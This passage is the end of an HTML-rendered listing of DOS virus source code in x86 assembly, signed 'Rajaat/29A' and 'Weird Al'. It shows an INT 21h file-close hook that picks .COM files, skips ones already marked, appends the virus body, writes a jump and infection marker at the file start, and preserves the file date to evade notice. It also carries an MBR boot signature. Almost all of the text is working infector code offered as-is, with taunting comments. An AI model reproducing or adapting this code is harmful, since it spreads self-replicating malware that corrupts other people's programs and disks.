                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">eoi_21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3e</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">eoi_21</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ea</span><span class="sc0">                          </span><span class="sc1">; No, bailout to next INT 21</span><span class="sc0">
</span><span class="sc5">old_21</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; handler</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5d06</span><span class="sc0">                     </span><span class="sc1">; Get DSA</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">27e</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Get current SFT</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">80</span><span class="sc0">      </span><span class="sc1">; Is it a device?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_infected</span><span class="sc0">                 </span><span class="sc1">; Yes, we assume it's infected</span><span class="sc0">

</span><span class="sc1">;=====( Check extension )======================================================</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">or_mask</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00ffffff</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'moc'</span><span class="sc0">                   </span><span class="sc1">; COM?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">is_infected</span><span class="sc0">                 </span><span class="sc1">; No, it's infected (N0T!)</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; File is now read/write</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0fe</span><span class="sc0">      </span><span class="sc1">; (except for Novell)</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_start</span><span class="sc0">                 </span><span class="sc1">; Go start of file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3f</span><span class="sc0">                       </span><span class="sc1">; Read first 4 bytes of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">; the file</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">host_bytes</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">host_bytes</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">    </span><span class="sc1">; I don't want to infect</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_infected</span><span class="sc0">                  </span><span class="sc1">; misnamed files like</span><span class="sc0">
                                                </span><span class="sc1">; COMMAND.COM of Winblows 95</span><span class="sc0">
                                                </span><span class="sc1">; so I assume they are infected</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">host_bytes</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'['</span><span class="sc0">   </span><span class="sc1">; Reinfections suck, so I</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_infected</span><span class="sc0">                  </span><span class="sc1">; also check if it's infected</span><span class="sc0">
                                                </span><span class="sc1">; already</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202</span><span class="sc0">                     </span><span class="sc1">; Goto EOF</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                        </span><span class="sc1">; 64K+?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_infected</span><span class="sc0">                 </span><span class="sc1">; Yes, we infected is (I must</span><span class="sc0">
                                                </span><span class="sc1">; make better labels sometime)</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000</span><span class="sc0">                    </span><span class="sc1">; &gt;F000 bytes?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">is_infected</span><span class="sc0">                  </span><span class="sc1">; Yes, assume infected</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; Calculate relative jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">jump_address</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">main</span><span class="sc0">                     </span><span class="sc1">; Write virus at end of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_bytes</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">write_ok</span><span class="sc0">                    </span><span class="sc1">; If no error, goto write_ok</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">is_infected</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">host_bytes</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">old_2f</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0abba20cdh</span><span class="sc0">                   </span><span class="sc1">; Original host</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[Weird Al]'</span><span class="sc0">                 </span><span class="sc1">; Weird Al Yankovic or</span><span class="sc0">
                                                </span><span class="sc1">; Weird Artificial Life? ;-)</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">2be</span><span class="sc0">                         </span><span class="sc1">; ouch!</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">080</span><span class="sc4">,</span><span class="sc2">000</span><span class="sc4">,</span><span class="sc2">001</span><span class="sc4">,</span><span class="sc2">000</span><span class="sc4">,</span><span class="sc2">005</span><span class="sc0">          </span><span class="sc1">; Extended (severely fucked</span><span class="sc0">
</span><span class="sc5">or_mask</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc4">,</span><span class="sc2">020</span><span class="sc4">,</span><span class="sc2">020</span><span class="sc4">,</span><span class="sc2">020</span><span class="sc0">              </span><span class="sc1">; fucked partition)</span><span class="sc0">

</span><span class="sc5">write_ok</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_start</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                       </span><span class="sc1">; Go to the start of the file</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">jumper</span><span class="sc0">                   </span><span class="sc1">; and write the jump to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">; virus and infection marker</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; Disallow file date/time</span><span class="sc0">

</span><span class="sc5">is_infected</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">eoi_21</span><span class="sc0">

</span><span class="sc5">seek_start</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200</span><span class="sc0">                     </span><span class="sc1">; Multiple purpose seek</span><span class="sc0">
</span><span class="sc5">seek</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; routine</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">jumper</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9</span><span class="sc0">                          </span><span class="sc1">; The jump for at the start of</span><span class="sc0">
</span><span class="sc5">jump_address</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; the COM file</span><span class="sc0">
</span><span class="sc5">signature</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[ Rajaat/29A ]'</span><span class="sc0">             </span><span class="sc1">; Guess who???</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">2fe</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">55</span><span class="sc4">,</span><span class="sc2">0aa</span><span class="sc0">                       </span><span class="sc1">; MBR signature (needed!)</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">virus_bytes</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc0">
</span><span class="sc5">virus_paras</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_bytes</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_sectors</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_bytes</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">
</span></div></body>
</html>
